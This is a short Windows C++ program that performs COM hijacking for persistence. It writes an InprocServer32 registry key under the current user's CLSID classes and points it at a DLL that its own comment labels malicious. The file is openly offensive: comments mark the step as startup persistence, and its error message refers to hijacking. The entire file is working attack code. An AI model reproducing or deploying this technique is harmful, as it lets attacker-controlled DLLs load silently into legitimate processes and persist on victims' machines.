#include <windows.h>
#include <string.h>
#include <cstdio>

int main(int argc, char* argv[])
{
	HKEY hKey = NULL;
	// Subkey
	const char* sk = "Software\\Classes\\CLSID\\{A6FF50C0-56C0-71CA-5732-BED303A59628}\\InprocServer32";

	// Malicious DLL
	const char* dll = "C:\\Users\\User\\Desktop\\shared\\Path\\name.dll";

	// Startup 
	LONG res = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)sk, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hKey, NULL);
	if (res == ERROR_SUCCESS)
	{
		RegSetValueEx(hKey, NULL, 0, REG_SZ, (unsigned char*)dll, strlen(dll));
		RegCloseKey(hKey);
	}
	else
	{
		printf("Cannot create subkey for hijacking :( \n");
		return -1;
	}
	return 0;
}